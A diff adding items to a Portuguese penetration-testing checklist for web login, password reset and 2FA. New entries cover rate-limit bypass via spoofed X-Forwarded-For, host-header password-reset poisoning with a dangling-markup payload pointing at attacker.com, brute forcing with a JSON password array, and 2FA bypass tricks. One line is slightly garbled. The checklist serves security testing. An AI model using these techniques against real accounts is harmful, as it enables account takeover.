@@ -280,6 +280,30 @@ Se você encontrar que WebDav está habilitado mas você não tem as permissões
 * [ ] Tente por Injeção SQL na página de login
 * [ ] Tente ganhar acesso com a ajuda do ID da sessão
 * [ ] Tente múltiplos logins permitidos ou não?
+* [ ] Ignorar limite de taxa com X-Forwarded-For: para possuir autenticação
+* [ ] Injeção de cabeçalho de host na página de esquecimento de senha
+* [ ] Teste a funcionalidade lembre-se de mim
+* [ ] Teste a redefinição e/ou recuperação de senha
+* [ ] Vá para a página de redefinição de senha e adicione dois e-mails ao enviar o link de redefinição de senha (você pode receber dois links de redefinição de senha)
+* [ ] Enganação de cache da Web (site.com/file/ok.css)
+* [ ] As proteções PHP podem ser ignoradas usando \[] como password=123 ----> passwordl]= (tokens CSRF também)
+* [ ] Ao redefinir a senha, altere o cabeçalho do host para o seu servidor (VPS) = link secreto para o seu vps
+* [ ] Proteção de limite de taxa de bypass: Altere o IP do sistema por solicitação
+* [ ] \#Envenenamento de redefinição de senha por meio de marcação pendente Host: victim.com:'\<a href="//attacker.com/?
+* [ ] Adicione X-Forwarded-For: 127.0.0.1 ou 1-1000 para passar a proteção de limite de taxa
+* [ ] Faça login em uma conta válida e depois em uma inválida, repita este processo para sobrecarregar o servidor para passar o limite de proteção de taxa (Observe que seu IP está bloqueado depois que você colocar 3 logins incorretos em seguida. De qualquer maneira, você pode resetar isto logando na sua própria conta quando este limite for alcançado).
+* [ ] Substitua o único valor da string da senha com alguma variedade de strings contendo todas as senhas candidatas. Por exemplo:
+
+```
+"username" : "test_account",
+"password" : [
+"123456",
+"password",
+"qwerty"
+...
+```
+
+* [ ] Se você colocar o código errado duas vezes, você vai ser desconectado de novo, ignore isso usando macros (Você precisa usar uma sessão do Burp com recursos de manuseio para conectar de volta automaticamente antes de enviar cada requisição).
 
 
 
@@ -821,6 +845,10 @@ Se você encontrar que WebDav está habilitado mas você não tem as permissões
 * [ ] Tente ignorar 2FA usando uma entrada nula ou vazia
 * [ ] Tente ignorar o 2FA alterando o boolean para falso
 * [ ] Tente ignorar o 2FA removendo o parâmetro 2FA na solicitação
+* [ ] Acesse o conteúdo diretamente (site.com/profile)
+* [ ] Faça login usando Oauth Gmail ou Facebook para ignorar 2FA
+* [ ] Redefina a senha e faça login na conta para ignorar 2FA
+* [ ] Use o token antigo ou altere a resposta
 
 
 
